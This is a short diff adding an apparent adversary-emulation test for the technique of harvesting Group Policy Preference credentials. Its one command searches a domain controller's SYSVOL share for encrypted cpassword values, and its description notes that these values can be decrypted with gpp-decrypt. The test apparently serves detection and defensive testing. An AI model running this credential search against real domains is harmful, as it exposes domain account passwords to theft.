@@ -1,0 +1,12 @@
+#TechniqueName: Unsecured Credentials: Group Policy Preferences
+#AtomicTestName: GPP Passwords (findstr)
+#Description: Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.&
+#Language: cmd
+
+#get_prereq_commands
+Write-Host Joining this computer to a domain must be done manually
+
+
+#commands
+findstr /S cpassword %logonserver%\sysvol\*.xml
+
